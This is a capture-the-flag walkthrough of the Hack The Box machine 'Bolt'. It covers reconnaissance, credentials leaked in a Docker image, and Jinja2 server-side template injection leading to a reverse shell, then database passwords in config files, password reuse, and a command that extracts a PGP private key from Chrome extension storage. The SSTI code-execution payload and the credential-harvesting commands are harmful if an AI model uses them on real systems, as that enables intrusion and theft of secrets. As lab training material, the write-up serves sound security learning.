# Bolt

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Sun Sep 26 14:02:17 2021 as: nmap -vvv -p 22,80,443 -sCV -oA init 10.129.224.33
Nmap scan report for 10.129.224.33
Host is up, received syn-ack (0.37s latency).
Scanned at 2021-09-26 14:02:24 +07 for 34s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkj3wwSWqzkYHp9SbRMcsp8vHlgm5tTmUs0fgeuMCowimWCqCWdN358ha6zCdtC6kHBD9JjW+3puk65zr2xpd/Iq2w+UZzwVR070b3eMYn78xq+Xn6ZrJg25e5vH8+N23olPkHicT6tmYxPFp+pGo/FDZTsRkdkDWn4T2xzWLjdq4Ylq+RlXmQCmEsDtWvNSp3PG7JJaY5Nc+gFAd67OgkH5TVKyUWu2FYrBc4KEWvt7Bs52UftoUTjodRYbOevX+WlieLHXk86OR9WjlPk8z40qs1MckPJi926adEHjlvxdtq72nY25BhxAjmLIjck5nTNX+11a9i8KSNQ23Fjs4LiEOtlOozCFYy47+2NJzFi1iGj8J72r4EsEY+UMTLN9GW29Oz+10nLU1M+G6DQDKxoc1phz/D0GShJeQw8JhO0L+mI6AQKbn0pIo3r9/hLmZQkdXruJUn7U/7q7BDEjajVK3gPaskU/vPJRj3to8g+w+aX6IVSuVsJ6ya9x6XexE=
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF5my/tCLImcznAL+8z7XV5zgW5TMMIyf0ASrvxJ1mnfUYRSOGPKhT8vfnpuqAxdc5WjXQjehfiRGV6qUjoJ3I4=
|   256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxr2nNJEycZEgdIxL1zHLHfh+IBORxIXLX1ciHymxLO
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-title:     Starter Website -  About
|_http-favicon: Unknown favicon MD5: 76362BB7970721417C5F484705E5045D
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-02-24T19:11:23
| Not valid after:  2022-02-24T19:11:23
| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6
| SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132
| -----BEGIN CERTIFICATE-----
| MIIDozCCAougAwIBAgIUWYR6DcMDhx5i4CpQ5qkkspuUULAwDQYJKoZIhvcNAQEL
| BQAwYTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDEaMBgGA1UEAwwRcGFzc2JvbHQuYm9s
| dC5odGIwHhcNMjEwMjI0MTkxMTIzWhcNMjIwMjI0MTkxMTIzWjBhMQswCQYDVQQG
| EwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lk
| Z2l0cyBQdHkgTHRkMRowGAYDVQQDDBFwYXNzYm9sdC5ib2x0Lmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALPBsFKzUPba5tHWW85u/Do3CkSsUgWN
| Wp5ZShD3T3hRX+vxFjv0zVZaccLhY8gsoTaklvFZVrguU6rIKHCFpRt7JLSPCmx3
| /Dy8id1Fm3VgRStVcMdXFnWne3lZaw9cSqdAxzb6ZcERAZRlIOPj29zO5UIwvwTW
| FJwybndHlxZ9Y8TUT7O1z5FFNKMl/QP6DBdkDDTc+OQ9ObyYHd6zBdwfuJykX8Md
| 3ejO1n38j8zXhzB/DEwKVKqFqvm7K28OBOouOaHnqM5vO5OVEVNyeZhaOtX1UrOm
| c+B8RSHDU7Y7/6sbNxJGuwpJZtovUa+2HybDRJl92vnNeouddrdFZc0CAwEAAaNT
| MFEwHQYDVR0OBBYEFCjzBazWUuLcpQnqbcDsisjmzvYzMB8GA1UdIwQYMBaAFCjz
| BazWUuLcpQnqbcDsisjmzvYzMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
| BQADggEBAA2qDGXEgqNsf4XqYqK+TLg+pRJ/rrdAFtxNwn8MYQv4ZlyouQsN2zPm
| t/dXls0iba1KvgYrt5QGWGODI8IkaujEDC452ktOmmi9+EnpK9DjKoKfCTL4N/ta
| xDZxR4qHrk35QVYB8jYVP8S98gu5crTkAo9TGiHoEKPvinx+pA9IHtynqh9pBbuV
| /micD+zMBVlZ50MILbcXqsBHRxHN4pmbcfc4yEOanNVJD3hmGchcyAFx2RLPsl36
| +QrGlwqpP7Bn7wzVCuxzQUWlA9VwVZKHYVVvCekvVP9DKL6FfI5avLgJJujQTqKw
| +uYRUUWj+CdI1oxxYt0SdimXHr81SgE=
|_-----END CERTIFICATE-----
|_http-favicon: Unknown favicon MD5: 82C6406C68D91356C9A729ED456EECF4
| http-methods:
|_  Supported Methods: GET HEAD POST
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 26 14:02:58 2021 -- 1 IP address (1 host up) scanned in 41.56 seconds
```

Looking at the SSL certificate of the web server on port 443, we can see a domain name: `passbolt.bolt.htb`, so we add that to our `/etc/hosts`. When then also fuzz for subsomains.

```sh
$ ffuf -u "http://passbolt.bolt.htb/" -H "Host: FUZZ.bolt.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 30347
mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99, Duration: 380ms]
demo                    [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 366ms]
lektro                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2802ms]
www.planning            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4202ms]
www.acc1                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4199ms]
shone                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4698ms]
accessedge              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5487ms]
www.emploi              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3123ms]
www.classified          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1511ms]
```

We then add all the found subdomains to our `/etc/hosts`. However, among the above subdomains, only `mail` and `demo` have anything new. Additionally, the only new things sites on port 80, as accessing the new subdomains on port 443 just give the same page as `https://passbolt.bolt.htb`.

Looking at the web page on port 443, we have the login page `/auth/login`. Trying to log in with an invalid email redirects us to the recovery page to `/users/recover`. We need a valid email for both which we currently don't have so we move on, looking out for email addresses. We run `gobuster` on the root page while we go through other things.

```sh
$ gobuster dir -u "https://passbolt.bolt.htb/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -k -t 100 -o _
/img                  (Status: 403) [Size: 162]
/login                (Status: 200) [Size: 2723]
/resources            (Status: 200) [Size: 2723]
/users                (Status: 200) [Size: 2723]
/css                  (Status: 403) [Size: 162]
/groups               (Status: 200) [Size: 2723]
/js                   (Status: 403) [Size: 162]
/app                  (Status: 200) [Size: 2723]
/logout               (Status: 200) [Size: 2723]
/fonts                (Status: 403) [Size: 162]
/recover              (Status: 200) [Size: 2723]
/locales              (Status: 403) [Size: 162]
/roles                (Status: 200) [Size: 2723]
/healthcheck          (Status: 403) [Size: 3738]
```

I also run `gobuster` on the 3 pages on port 80 while I enumerate.

```sh
$ gobuster dir -u "http://passbolt.bolt.htb/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
/contact              (Status: 200) [Size: 26293]
/download             (Status: 200) [Size: 18570]
/index                (Status: 200) [Size: 30347]
/login                (Status: 200) [Size: 9287]
/register             (Status: 200) [Size: 11038]
/profile              (Status: 500) [Size: 290]
/services             (Status: 200) [Size: 22443]
/pricing              (Status: 200) [Size: 31731]
/logout               (Status: 200) [Size: 30347]
/sign-in              (Status: 200) [Size: 9287]
/sign-up              (Status: 200) [Size: 11038]

$ gobuster dir -u "http://demo.bolt.htb/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
/login                (Status: 200) [Size: 9710]
/register             (Status: 200) [Size: 11066]
/logout               (Status: 200) [Size: 9710]

$ gobuster dir -u "http://mail.bolt.htb/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
Error: the server returns a status code that matches the provided options for non existing urls. http://mail.bolt.htb/5bf536fa-fded-47c5-ae33-3f2525e86542 => 200 (Length: 4987). To continue please exclude the status code or the length
```

Looking around the page `passbolt.bolt.htb` on port 80, we just have a few static pages. On `/contact`, we have the emails `support@bolt.htb` and `sales@bolt.htb`. On the page `/download`, we have a Docker image (`image.tar`) we can download. Extracting the archive, we just see that it's a Flask app. Going through the directories with whose names are hashes and have `layer.tar`, I extracted each `layer.tar` and examine the contents. The following files have interesting data.

- `745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py` has a `SECRET_KEY` and database credentials.

```python
class Config(object):

    basedir    = os.path.abspath(os.path.dirname(__file__))

    # Set up the App SECRET_KEY
    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')

    # This will create a file in <app> FOLDER
    SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    MAIL_SERVER = 'localhost'
    MAIL_PORT = 25
    MAIL_USE_TLS = False
    MAIL_USE_SSL = False
    MAIL_USERNAME = None
    MAIL_PASSWORD = None
    DEFAULT_MAIL_SENDER = 'support@bolt.htb'

class ProductionConfig(Config):
    DEBUG = False

    # Security
    SESSION_COOKIE_HTTPONLY  = True
    REMEMBER_COOKIE_HTTPONLY = True
    REMEMBER_COOKIE_DURATION = 3600

    # PostgreSQL database
    SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(
        config( 'DB_ENGINE'   , default='postgresql'    ),
        config( 'DB_USERNAME' , default='appseed'       ),
        config( 'DB_PASS'     , default='pass'          ),
        config( 'DB_HOST'     , default='localhost'     ),
        config( 'DB_PORT'     , default=5432            ),
        config( 'DB_NAME'     , default='appseed-flask' )
    )
```

This, however, seems to just be the default file from `https://github.com/app-generator/flask-black-dashboard/blob/master/config.py`.

- `a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3` contains admin credentials.

```sqlite3
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "User" (
	id INTEGER NOT NULL,
	username VARCHAR,
	email VARCHAR,
	password BLOB,
	email_confirmed BOOLEAN,
	profile_update VARCHAR(80),
	PRIMARY KEY (id),
	UNIQUE (username),
	UNIQUE (email)
);
INSERT INTO User VALUES(1,'admin','admin@bolt.htb',X'243124736d31526365436824725364335079676e532f366a6c46446646324a35712e',NULL,NULL);
COMMIT;
```

The admin account in the sqlite3 dump gives us the hex-encoded password hash for the admin account. You should be able to crack it using hashcat and `rockyou`, though I cracked it with `https://www.somd5.com/`. With that cracked, we should have the password "deadbolt".

The credentials for admin can be used to log into `http://passbolt.bolt.htb/`. Looking at the chat box ...

... we see someone named Eddie is mentioned. Simply by guessing and checking with `https://passbolt.bolt.htb/auth/login`, we can get a valid email address: `eddie@bolt.htb`. Considering Eddie's mentioned quite a lot in the talk, we may want to target his account.

Looking at `http://demo.bolt.htb/login`, we're able to sign up new accounts. We also see on the sign up page that emails need to be of the `@bolt.htb` domain. However, we don't have and invite code and thus can't sign up. When trying to sign up without a valid invite, we get the error "Invalid invitation code. Sorry...". Going back to the docker image, searching for "invitation" gives us the file `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/code-500.html`. With that, I searched around for the word "code" and found the invite code "XNSS-HSJW-3NGU-8XTJ" in `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py`. With that, we should be able to register and log into `http://demo.bolt.htb/`.

Looking at the documentation ...

... we can see that we have AdminLTE version 3.0. However, searching with `searchsploit` gives nothing immediately useful, and looking up on `duckduckgo` gives us largely XSS vulnerabilites.

Going to `http://mail.bolt.htb/`, we see that we're able to log in with the account we created in `demo.bolt.htb`. Looking at the about tab in the bottom left, we see that the mail server is Roundcube Webmail 1.4.6, with the plugins `filesystem_attachments` 1.0 and `jqueryui` 1.12.0. We can't find anything for those with `searchsploit`. We also can't send mail either.

I then went back to `http://demo.bolt.htb/`. Looking at the footer of the demo page, we see "AdminLTE Flask" so we know we're working with a Flask application. Flask applications often use templating engines like Jinja2, so we go on to test for SSTI (Server-Side Template Injection). We have settings we can change in `http://demo.bolt.htb/admin/profile` in the "Settings" tab.

Every change we make to the profile settings needs to be confirmed via email on `http://mail.bolt.htb`. Changing the "Name" field, I found SSTI. I found `{{7*7}}` to work, as the email confirming the change evaluates it to `49`. Following [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify), I then tried `{{7*'7'}}` which works, so we know we're working with Jinja2. I then tried `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` which successfully executes `ls` so we have code execution. Finally, I replaced `ls` with a reverse shell, set up a listener, confirmed the changes with the email, and got a shell as `www-data`.

In the landing directory, `/var/www/demo`, is `config.py`, whose contents are as follows

```python
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```

The same file is also at `/var/www/dev`. We see that we have credentials to `mysql` as the user `bolt_dba`. With that, we should be able to log into MySQL.

```sh
www-data@bolt:~/demo$ mysql -u bolt_dba --password
```

We have only the database `boltmail` and its table `user`. Within that table is admin's password hash, alongside our account's.

```
mysql> select username,password,email from user;
+----------+------------------------------------+----------------+
| username | password                           | email          |
+----------+------------------------------------+----------------+
| admin    | $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. | admin@bolt.htb |
```

Cracking it gives us the same password as before: "deadbolt".

Looking around, I found `/var/www/roundcube/config/config.inc.php` which also contains `mysql` credentials

```
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
```

Using that, we're able to look around at the `roundcube` database. Unfortunately, there's nothing useful in this database.

Looking for more database credentials ...

```sh
www-data@bolt:~$ grep -R 'mysql://'
demo/config.py:SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
dev/config.py:SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
Binary file dev/uploads/image.tar matches
roundcube/plugins/squirrelmail_usercopy/config.inc.php.dist:// 'mysql://dbuser:dbpass@localhost/database'
roundcube/plugins/squirrelmail_usercopy/config.inc.php.dist:$config['squirrelmail_dsn'] = 'mysql://user:password@localhost/webmail';
roundcube/public_html/plugins/squirrelmail_usercopy/config.inc.php.dist:// 'mysql://dbuser:dbpass@localhost/database'
roundcube/public_html/plugins/squirrelmail_usercopy/config.inc.php.dist:$config['squirrelmail_dsn'] = 'mysql://user:password@localhost/webmail';
roundcube/config/config.inc.php.sample:$config['db_dsnw'] = 'mysql://roundcube:pass@localhost/roundcubemail';
roundcube/config/config.inc.php://       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
roundcube/config/config.inc.php:$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
roundcube/config/defaults.inc.php://       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
roundcube/config/defaults.inc.php:$config['db_dsnw'] = 'mysql://roundcube:@localhost/roundcubemail';
```

... we get nothing new, just a bunch of default/sample credentials. Checking `/var/www/dev/uploads/image.tar`, it's just the same image we previously downloaded, nothing new their either.

Looking at `/etc`, we have `/etc/passbolt`. In that directory is `passbolt.php` which contains the following database configuration.

```php
    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],
```

With those credentials, we can access the `passboltdb` database. Looking at the tables, we have `secrets` which holds a PGP message. We might be able to decrypt it if we can find the secret key, so we make note of it and move on, as there's nothing else useful in the database.

I then tried all the found passwords on other users and found that `rT2;jW7<eY8!dX8}pQ8%` is also eddie's password and was able to `su` into his account.

I looked around and found that in `/var/mail` is a mail left for eddie.

```sh
eddie@bolt:/var/mail$ cat eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
	id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

Looks like we have a private key to find, possibly the same one needed to decrypt the secret from `passboltdb`. I tried using `find` to look for PGP/GPG keys but to no avail. At this point, I just ran linpeas as both `www-data` and `eddie`. In eddie's results, the section "Possible private SSH keys were found!", we have `/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log` which contains a private PGP key, which I extracted.

```sh
strings 000003.log | grep eddie | grep -oE '(-----BEGIN PGP PRIVATE KEY BLOCK-----.+-----END PGP PRIVATE KEY BLOCK-----)' | uniq | sed 's/\\\\r\\\\n/\n/g'
```

We can then try importing the key. However, we're met with a password prompt. We can import but not use the key. We can run `gpg2john` and crack the generated hash with `john` and rockyou, giving us the password "merrychristmas". Using the key, we can decrypt the secret to get a password. With that password, we can `su` into root and root the machine.
